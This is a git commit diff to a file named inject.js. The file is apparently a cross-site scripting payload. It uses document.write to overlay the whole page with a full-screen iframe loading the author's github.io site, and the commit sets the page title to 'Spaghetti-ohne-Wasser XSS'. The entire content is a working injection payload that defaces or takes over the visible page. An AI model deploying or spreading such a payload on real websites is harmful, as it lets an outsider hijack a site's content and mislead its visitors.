d61525528b84f48a2c8a4348824c818613c5bff2
Spaghetti ohne Wasser! <105888772+spaghetti-ohne-wasser@users.noreply.github.com>
2023-01-23 23:09:53 -0800

    Update inject.js

--- inject.js
+++ inject.js
@@ -1,1 +1,2 @@
-document.write('<iframe src="//spaghetti-ohne-wasser.github.io" width="100%" height="100%" style="position:absolute; top:0; left:0;"></iframe>')
+document.write('<iframe src="//spaghetti-ohne-wasser.github.io" width="100%" height="100%" style="position:absolute; top:0; left:0;"></iframe>');
+document.title = "Spaghetti-ohne-Wasser XSS";
